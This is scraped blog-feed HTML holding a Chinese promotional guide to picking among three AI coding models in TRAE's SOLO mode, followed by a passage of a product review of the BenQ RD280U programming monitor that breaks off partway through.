  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-06T09:45:47.000Z" title="Tue Jan 06 2026 09:45:47 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-06
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ae941bc5b84447eb9b8c3fbeeb10fded~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVFJBRV9haQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768297546&amp;x-signature=NDECseIzJLciZpHyxLk6xOkKvno%3D" alt="" loading="lazy"/></p>
<p>TRAE 国际版 SOLO 模式已内置 3 种模型——<strong>Gemini-3-Pro-Preview</strong>、<strong>GPT-5-medium</strong> 和 <strong>Kimi-K2-0905</strong>。不同模型在开发过程中的不同环节各有所长，选择模型的核心并非 “哪款模型最优”，而是<strong>哪款模型最适配你要交付的任务。</strong></p>
<p>以下是我们为你提供的一种模型选择思路：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4479ede51bd442ffb04ce9d9b36368b8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVFJBRV9haQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768297546&amp;x-signature=zI%2BUwxucEy4TOIpzgO3%2B9TP8fdg%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-0"><strong>Gemini-3-Pro-Preview：适用于智能体驱动、长周期、多模态任务</strong></h2>
<p>当任务场景宽泛、各环节相互关联，且需要在上下文里统筹多个动态模块时，Gemini-3-Pro-Preview 的优势最为突出：</p>
<ul>
<li>
<p>擅长智能体驱动的编码流程 —— 相比单次指令调用，通过命令行界面 / 工具调用流程运行时表现更佳</p>
</li>
<li>
<p>具备出色的多模态理解能力（涵盖文本、代码、设计规范、UI 设计），非常适合全栈开发工作</p>
</li>
<li>
<p>长周期任务表现稳定可靠 —— 可胜任大型代码库的迁移、架构调整以及全局调试工作</p>
</li>
</ul>
<h3 data-id="heading-1"><strong>国际版 SOLO + Gemini-3-Pro-Preview 适用场景示例：</strong></h3>
<p>当任务属于 “牵一发而动全身” 的类型时，Gemini-3-Pro-Preview 通常是优选方案。</p>
<ul>
<li>
<p>Gemini-3-Pro-Preview 智能体可充当 UI 工程师，基于多模态输入的设计规范生成界面并持续迭代优化</p>
</li>
<li>
<p>智能体可并行处理后端逻辑、应用程序接口（API）或数据模型的开发工作</p>
</li>
<li>
<p>TRAE 国际版 SOLO 模式负责统筹协调各智能体，Gemini-3-Pro-Preview 则保障各层级的一致性</p>
</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/76b7ffeb89ee46afa11120face703d49~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVFJBRV9haQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768297546&amp;x-signature=A%2BclyRnjo1eIl9i4PYNz8ms3k54%3D" alt="gemini-3-use-case (1).gif" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7648d7d46b0c413a9314c5ddbc6a4e4b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVFJBRV9haQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768297546&amp;x-signature=3KeZkFO2YrC4pDiOr1ytVPtTudk%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-2"><strong>GPT-5-medium：适用于结构化迭代与生产级别的代码修改</strong></h2>
<p>GPT-5-medium 就像一位经验丰富的资深工程师，你可以放心地将需要严谨思考、周密规划的修改任务交付给它：</p>
<ul>
<li>
<p>擅长重构、调试循环、测试框架搭建等迭代式编码流程</p>
</li>
<li>
<p>兼顾强大的通用推理能力与编码能力，给出的方案更适用于生产环境</p>
</li>
<li>
<p>拥有超大上下文窗口（最高 272k），能够应对复杂的实际项目需求</p>
</li>
<li>
<p>配套工具生态成熟，在各类编辑器、应用程序接口（API）和插件中表现稳定</p>
</li>
</ul>
<h3 data-id="heading-3"><strong>国际版 SOLO + GPT-5-medium 适用场景示例：</strong></h3>
<p><strong>1. 系统重构</strong></p>
<ul>
<li>
<p>将大规模重构任务拆解为清晰的步骤，逐步推进</p>
</li>
<li>
<p>确保重构过程中各模块的核心约束条件始终有效</p>
</li>
</ul>
<p><strong>2. 遗留代码调试</strong></p>
<ul>
<li>
<p>跨文件追踪业务逻辑，定位问题根源</p>
</li>
<li>
<p>遵循 “先写测试，再改代码” 的流程，降低修改风险</p>
</li>
</ul>
<p>GPT-5-medium 与 TRAE 国际版 SOLO 模式的 <strong>Plan</strong> 尤为契合，可以生成清晰的方案、有条理地执行任务并生成高度准确的结果。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fbeccdfb227b4945ae184ebeb1b70276~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVFJBRV9haQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768297546&amp;x-signature=gtHBAic6mnjwMyAwR3nag1OpoUo%3D" alt="gpt-5-use-case (1).gif" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/26ea123f7c2c409d96267dfa8bc5dcf2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVFJBRV9haQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768297546&amp;x-signature=vov8JF3%2BeqGXYoaq3IKP6lmA93Q%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-4"><strong>Kimi-K2-0905：适用于执行高效自动化、高性价比的任务</strong></h2>
<p>Kimi-K2-0905 决策果断、响应迅速，能够高效推进任务，是无需人工干预的自动化任务的理想选择：它擅长多步骤逻辑处理与自主化工作流，尤其适用于研发调研或自动化脚本开发任务；单 token 使用成本远低于多数商用闭源模型，性价比突出，在日常开发工作中运行速度极快，延迟低，能够实现快速迭代。</p>
<h3 data-id="heading-5"><strong>国际版 SOLO + Kimi-K2-0905 适用场景示例：</strong></h3>
<p><strong>1. 处理重复性或机械性开发工作：</strong> 清理冗余代码、生成通用模板代码、转换数据格式、统一重构代码语言风格</p>
<p><strong>2. 作为子智能体执行辅助任务：</strong> Kimi-K2-0905 可以自主运行处理后台辅助任务，你就能专注于更顶层的决策工作</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/82f5c208a50e404bbffc204aeb1ed935~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVFJBRV9haQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768297546&amp;x-signature=05fGP964ypi7GZlSWIBAMTl5S3A%3D" alt="kimi-k2-use-case (1).gif" loading="lazy"/></p>
<p><strong>SOLO 模式模型选型核心思路总结</strong></p>
<p>在 TRAE 国际版 SOLO 模式下，如何选择最合适的模型？你可以像带领一支真实的工程师团队一样，根据任务特点灵活调度、合理分工，让每个模型发挥其最大优势。</p>
<ul>
<li>
<p><strong>Gemini-3-Pro-Preview：</strong> 擅长广度覆盖、上下文统筹、多模态融合与系统化思考。</p>
</li>
<li>
<p><strong>GPT-5-medium：</strong> 以稳定可靠见长，善于结构化推进和生产级迭代优化。</p>
</li>
<li>
<p><strong>Kimi-K2-0905：</strong> 追求极速执行和自主运行，具备高性价比，专注落地执行。</p>
</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[程序员一天的视线，都消耗在什么地方？]]></title>    <link>https://juejin.cn/post/7591882877312729140</link>    <guid>https://juejin.cn/post/7591882877312729140</guid>    <pubDate>2026-01-06T09:48:49.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7591882877312729140" data-draft-id="7591942733365723170" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="程序员一天的视线，都消耗在什么地方？"/> <meta itemprop="keywords" content="程序员,前端"/> <meta itemprop="datePublished" content="2026-01-06T09:48:49.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="一点一木"/> <meta itemprop="url" content="https://juejin.cn/user/1063982986187486"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            程序员一天的视线，都消耗在什么地方？
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1063982986187486/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    一点一木
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-06T09:48:49.000Z" title="Tue Jan 06 2026 09:48:49 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-06
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读9分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h3 data-id="heading-0">前言：被忽视的生产力黑洞</h3>
<p>作为一名每天和代码打交道的开发者，你有没有认真算过一笔账：你的一天，视线都去哪了？</p>
<p>从早上 9 点坐到工位开始，<code>IDE</code>、终端、浏览器、文档、日志、<code>PR diff</code>、会议窗口轮番上阵，真正离开屏幕的时间，其实少得可怜。对于我们这种靠逻辑和视线吃饭的人来说，视线并不是无限的资源，而是一种昂贵的成本。</p>
<p>我的工位靠窗。上午光线还算柔和时，一切都正常；一到下午，阳光斜射进来，屏幕就开始反光，调角度、拉窗帘、眯眼看代码成了常态。深夜加班时，环境是安静了，但显示器的光又变成了另一种压力——刺眼、干涩、越看越烦躁。粗略算下来，视线每天锁定在屏幕上的时间，保守也有 10–12 个小时。</p>
<p>不少同行跟我聊过类似的问题：「为什么写代码越写越累？明明脑子还算清醒，但眼睛开始干、头有点涨，甚至为了看清屏幕，身体会不自觉往前凑。」我们很习惯给电脑升级内存、显卡、键盘，却经常忽略最关键的交互载体——显示器。普通办公显示器是为「看文档」设计的，电竞显示器是为「刷帧率」设计的，而程序员这种长期、高密度的「读写代码」场景，反而很少被认真对待。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/de016fd76a114f1384e06d4f14df87c2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiA54K55LiA5pyo:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768297728&amp;x-signature=Pwf1VOYrHZtaJaPR0WJ4nXUxLaw%3D" alt="最终封面图.jpg" loading="lazy"/>
最近我入手了<strong>明基 <code>RD280U</code></strong>。官方给它的定位很直接：专业编程显示器。我在京东评论区看它也都是满满的用户好评，所以决定买回来看看到底怎么样。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/053d8af5140548f1bea694c9d60afa6f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiA54K55LiA5pyo:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768297728&amp;x-signature=fta08OSoTUn3nPnlcJrCluS%2FVkc%3D" alt="京东评价" loading="lazy"/></p>
<p>接下来这篇文章，我会以「程序员一天的视线消耗」为主线，把它放进真实的工作流里，看看它到底解决了哪些问题，以及这笔投入到底值不值。</p>
<hr/>
<h3 data-id="heading-1">早晨：告别眩光，让注意力回到代码本身</h3>
<p>我以前最不喜欢的，其实就是上午到中午这段时间。工位靠窗，一旦光线变强，普通屏幕就像一面镜子：窗外轮廓、灯光反射，甚至自己的倒影，都会叠在代码区上。你以为自己在 <code>Debug</code>，实际上很多时候是在找字，效率自然高不起来。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a68f5c2ed7904aed8e54dbd7911e70c0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiA54K55LiA5pyo:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768297728&amp;x-signature=REglqpmCVi4OI34pY%2F0QVZdMNPg%3D" alt="vs" loading="lazy"/></p>
<p><code>RD280U</code> 最先让我感到差异的，是它的 <strong>抗反射面板</strong>。它并不是那种把画面整体磨糊的廉价雾面处理，而更像是在保证 <code>4K</code> 清晰度的前提下，通过特殊的图层物理特性把环境光的干扰压下去。</p>
<p><strong>实测体感：</strong> 以前下午两三点，我得跟太阳躲猫猫，身体扭成各种奇怪的姿势来避开反光。现在，即使阳光直射在屏幕边缘，字符依然保持了极高的锐利度，边缘干净，没有光散射带来的毛边。这种硬件级的视线降噪，让我不再需要为了屏幕去调整自己的坐姿，注意力能稳稳地锚定在逻辑本身。</p>
<p>另外一个很符合开发者阅读习惯的点是 <strong><code>3:2</code> 的屏比</strong>。说实话，这个参数在买之前单看并不直观，但用在 <code>VS Code</code> 里就很明显了：纵向空间确实多了一截。</p>
<ul>
<li><strong><code>16:9</code> 的痛点：</strong> 左右分栏后，底部开个终端，代码区就剩个扁长条，看个稍微长点的函数就得滚好几次鼠标。</li>
<li><strong><code>3:2</code> 的收益：</strong> 它多出了约 <code>18%</code> 的垂直视野。在重构长逻辑或者顺着调用栈往下追的时候，它能让你多看 5-10 行代码。在复杂的 <code>try-catch</code> 或嵌套循环里，这几行往往就是决定你思路是否中断的关键。滚动少了，大脑的上下文切换频率降低，这种隐形的效率提升非常可观。</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ed337bc9d87046efba4fe5cb8ff65a8b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiA54K55LiA5pyo:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768297728&amp;x-signature=Lt0dcAUbifp%2Fffd4WCnUf7yKPuA%3D" alt="对比图" loading="lazy"/></p>
<hr/>
<h3 data-id="heading-2">有些细节，只有长期写代码的人才会在意</h3>
<p>除了参数，<code>RD280U</code> 的一些物理设计也体现了对开发者的同理心。</p>
<p><strong>1. <code>3:2</code> 比例带来的天然纵深</strong> 在读长文档、翻 <code>Issue</code> 或查上千行的 <code>Legacy Code</code> 时，它比 <code>16:9</code> 屏幕多出来的垂直视野非常有用。配合丝滑的升降支架，你能轻松调到一个不用低头就能俯瞰全局的角度，这比强行把屏幕竖过来更符合人体工学。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c9f9e3b230b84853a26c10f3f63b78b9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiA54K55LiA5pyo:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768297728&amp;x-signature=4qa7UYt7GemQslwh6nFMV31io8M%3D" alt="20250225002650357.gif" loading="lazy"/></p>
<p><strong>2. 桌面秩序与心流</strong> 背部理线槽这种东西，刚拆箱时你可能不会在意，但当你桌面那些 <code>Type-C</code> 线、显示器电源线被收纳干净后，那种视线洁癖带来的心流感是非常棒的。它让你很少再被杂乱的边缘信息干扰。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d34b95f0722a42a78cf435b55ff85819~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiA54K55LiA5pyo:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768297728&amp;x-signature=kDEDTx13F2R9%2FhDCJJjdg%2BMteJk%3D" alt="20250225002432915.png" loading="lazy"/></p>
<p><strong>3. 编程触键</strong> 在屏幕正下方有一个专属的触控 <code>Bar</code>。对于我们这种反感繁琐菜单的人来说，能够一键切换色彩模式、调节亮度，这种实体层面的快捷键比在 <code>OSD</code> 菜单里按半天要高级得多。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/626bc1f7f4564190aa25ae121dbf48a4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiA54K55LiA5pyo:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768297728&amp;x-signature=hmnFEUNF2EpaZ2xjU05K739pJSE%3D" alt="编程按键" loading="lazy"/></p>
<hr/>
<h3 data-id="heading-3">午后：专属编程模式，不只是调高对比度</h3>
<p>下午往往是编码负载最重的时段：一边写业务，一边查文档，还要随时看日志，窗口一多，普通显示器的问题就开始被放大。要么整体发灰、层级不清；要么你为了看清楚，把亮度和对比度拉高，结果看久了更累。</p>
<p><code>RD280U</code> 的 <strong>专业编程模式</strong>，价值并不是看起来更艳，而是更适合长时间读代码。</p>
<p><strong>深度定制的模式逻辑：</strong></p>
<ul>
<li>
<p><strong>深色模式 (<code>Dark Theme</code>)：</strong> 针对我们常用的 <code>Darcula</code> 或 <code>One Dark</code> 主题。它通过算法增强了代码的高亮增益，关键字、字符串和注释之间的对比度被精准拉开。尤其是那种容易糊成一团的深灰色注释，现在一目了然。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e6e73a57169444daa3001ebc1e1e9a69~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiA54K55LiA5pyo:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768297728&amp;x-signature=NbculvieYBkx1wiJUHDTvEYOuzE%3D" alt="暗色主题" loading="lazy"/></p>
</li>
<li>
<p><strong>浅色模式 (<code>Light Theme</code>)：</strong> 针对习惯亮色主题的同学，它会刻意压住白光的蓝光峰值，避免那种白花花一片的视觉冲击。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d2aa0aac026a4f0bae45cf4f910a9933~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiA54K55LiA5pyo:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768297728&amp;x-signature=HBWk3MdlXU5TJKMh0NNpFkfFnBQ%3D" alt="亮色主题.jpg" loading="lazy"/>
<strong>个性化调控与京东评价的共鸣：</strong> 我刷京东官店评论时，看到一个老哥说：「像给眼睛上了润滑油」。这话听起来糙，但意思很准。我自己的玩法是：通过配套软件 <strong><code>Display Pilot 2</code></strong>，在编程模式的基础上微调对比度。软件能直接控制底层硬件，这种调节比软件滤镜要自然得多。代码没变，屏幕变了，那种眼球紧绷的感觉确实消失了。</p>
</li>
</ul>
